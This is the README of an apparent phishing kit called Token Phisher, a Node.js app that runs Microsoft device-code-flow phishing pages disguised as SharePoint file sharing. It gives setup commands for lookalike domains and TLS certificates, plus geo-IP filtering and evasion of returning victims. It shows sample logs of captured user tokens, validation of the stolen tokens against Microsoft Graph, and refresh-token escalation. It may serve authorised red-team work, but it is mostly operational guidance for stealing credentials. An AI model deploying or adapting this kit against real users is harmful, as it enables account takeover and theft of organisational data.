# Token Phisher

## Description
This NodeJS app listens for users accessing the website. In the background a Device Code Flow is started and the User Code presented to the user. Once the user finished the flow, the tokens are stored to a file. This default example is configured to imitate a file sharing process.

## Requirements
Node.js 18+

## Quick start

```bash
npm install
npm run setup -- --help
```

### Production (Let's Encrypt — recommended for deep subdomains)

Use this for hostnames like `gipi.sharepoint.com.documents.v06.zip`. Token needs **Zone → DNS → Edit** and **Zone → Read**:

```bash
export CLOUDFLARE_API_TOKEN=your_token_here

npm run setup -- \
  --domain gipi.sharepoint.com.documents.v06.zip \
  --tenant gipi.com \
  --tls letsencrypt
```

In Cloudflare DNS, set your **A record to grey cloud (DNS only)** — not proxied. Browsers connect directly to your server and trust the Let's Encrypt cert. Certs are stored in `/var/lib/tokenphisher/certs/` and renew with:

```bash
npm run renew -- --cf-token YOUR_TOKEN
```

Add a monthly cron to renew before the 90-day expiry.

### Production (Cloudflare Origin cert — shallow subdomains + proxy)

For `share.example.com` with **orange cloud (proxied)** DNS. Token needs **Origin CA Edit** + **SSL/Certificates Edit**:

```bash
npm run setup -- \
  --domain share.example.com \
  --tenant contoso.com \
  --tls cloudflare-origin
```

Set Cloudflare SSL/TLS mode to **Full (strict)**. Free edge SSL only covers one subdomain level — deeper names need Let's Encrypt (grey cloud) or paid Total TLS.

Setup will:
1. Fetch Microsoft OAuth URLs from OpenID discovery
2. Issue TLS certs (Let's Encrypt or Cloudflare Origin depending on `--tls`)
3. Write `config.json` and update `server.js`

**Redeploying** — reuse existing certs without a token if still valid:

```bash
git pull && npm install
npm run setup -- --domain gipi.sharepoint.com.documents.v06.zip --tenant gipi.com
```

Start the server:

```bash
sudo npm start   # ports 80/443 require elevated privileges on Linux
```

### Local testing (no TLS)

```bash
npm run setup -- --test-mode --tenant contoso.com
npm start
```

The app listens on HTTP port 80 (or change `httpPort` in config).

## Running

```bash
npm start
# or
node server.js
```

Configuration is loaded from `config.json` when present. If missing, `server.js` falls back to its embedded `defaultConfig`.

Re-run `npm run setup` any time to change settings or re-provision certificates. Setup always rewrites `config.json` and syncs `server.js`.

## Manual configuration

Copy the example and edit by hand if you prefer:

```bash
cp config.example.json config.json
```

Or edit `defaultConfig` in `server.js` directly, then run:

```bash
npm run setup -- --config-only --from-config config.json
```

### Configuration reference

| Key | Description |
|-----|-------------|
| `httpPort` | HTTP port (test mode only) |
| `httpsPort` | HTTPS port |
| `testMode` | `true` = HTTP only, no TLS |
| `debug` | Verbose console and log output |
| `clientId` | OAuth client ID — see [MS client ID research](https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt) |
| `tokenUrl` | Token endpoint (tenant must match `deviceCodeUrl`) |
| `deviceCodeUrl` | Device code flow start URL |
| `scopes` | Space-separated OAuth scopes; include `offline_access` for refresh tokens |
| `phishingHTML` | Template in `views/` shown to victims |
| `redirectUrl` | Redirect for `/` and blocked geo IPs |
| `alreadyLoggedInURL` | Redirect for returning victims (cookie set) |
| `cookieExpirationInDays` | Cookie lifetime |
| `userCodesFile` | Log of phished user codes |
| `logFile` | Application log |
| `tokenFile` | Captured tokens |
| `threemaOn` / `threemaTo` / `threemaFrom` / `threemaURL` / `threemaSecret` | Optional Threema notifications |
| `keyFilePath` / `certFilePath` / `caFilePath` | TLS certificate paths (set automatically by setup) |
| `userAgent` | User-Agent for OAuth requests |
| `geoipallowlist` | ISO country codes allowed to reach `/share` |
| `validateTokens` | After capture, probe Graph API and try refresh exchange (default: `true`) |
| `graphValidationScope` | Scope used when refreshing for Graph validation |

## Post-capture validation

When a victim completes device login, the console and `logfile.txt` show:

```
Visit /share — issued device code ABCD1234
Start polling token for code: ABCD1234
Success, your Azure tokens for code ABCD1234 were saved to tokens.txt
CAPTURE user=victim@gipi.com tenant=3fc8fb8d-... code=ABCD1234 name="Jane Doe"
GRAPH OK — Jane Doe (victim@gipi.com)
```

If the access token cannot call Graph (common with minimal scopes), a refresh exchange is attempted:

```
GRAPH BLOCKED — HTTP 401 with access_token: ...
Trying refresh_token exchange for Graph scope ...
REFRESH OK + GRAPH OK — Jane Doe (victim@gipi.com)
```

Refreshed tokens are saved to `<usercode>.graph-refresh.json`. Outcomes:

| Message | Meaning |
|---------|---------|
| `GRAPH OK` | Access token works against Microsoft Graph |
| `GRAPH BLOCKED` | Token captured but Graph denied with access token |
| `REFRESH OK + GRAPH OK` | FOCI-style refresh unlocked Graph access |
| `REFRESH BLOCKED` | Refresh failed — often CA, consent, or scope policy |

Set `"validateTokens": false` in config to disable.

## Smoke test (no victim account needed)

Verify config, TLS files, and OAuth device-code issuance without completing a login:

```bash
npm run smoke-test
npm run smoke-test -- --live-url https://gipi.sharepoint.com.documents.v06.zip/share
```

### Self-test without the client's tenant

Microsoft provides **generic endpoints** that work with any Azure AD work account you control:

| Tenant alias | Use case |
|--------------|----------|
| `common` | Any work/school Azure AD account |
| `organizations` | Work/school only (no personal Microsoft accounts) |
| `yourname.onmicrosoft.com` | Your own dev tenant |

**Quick self-test with `/common/`:**

```bash
npm run setup -- --test-mode --tenant common
npm start
npm run smoke-test -- --use-common
```

Visit `http://localhost/share` (or your HTTPS URL) and sign in at `microsoft.com/devicelogin` with **any account you own** in Azure AD (not the client's gipi.com tenant).

**Free dev tenant (no custom domain required):**

1. Join the [Microsoft 365 Developer Program](https://developer.microsoft.com/microsoft-365/dev-program)
2. You get `something.onmicrosoft.com` + test users in the admin portal
3. Run setup with that tenant:

```bash
npm run setup -- --test-mode --tenant yourtenant.onmicrosoft.com
```

OpenID discovery fills in `tokenUrl` and `deviceCodeUrl` automatically — same as for gipi.com.

## Certificates

| Mode | Best for | Cloudflare DNS | Browser SSL |
|------|----------|----------------|-------------|
| `letsencrypt` (default) | Deep subdomains | Grey cloud (DNS only) | LE cert — trusted everywhere |
| `cloudflare-origin` | Shallow subdomains + hide IP | Orange cloud (proxied) | CF edge cert (free tier: one level only) |

Certs persist at **`/var/lib/tokenphisher/certs/<domain>/`**. Let's Encrypt certs expire every ~90 days — run `npm run renew`.

## Other notes

- Static assets for the phishing page go in `public/assets/`
- User codes expire after 15 minutes; polling stops automatically
- The app logs polling status every minute when debug is off
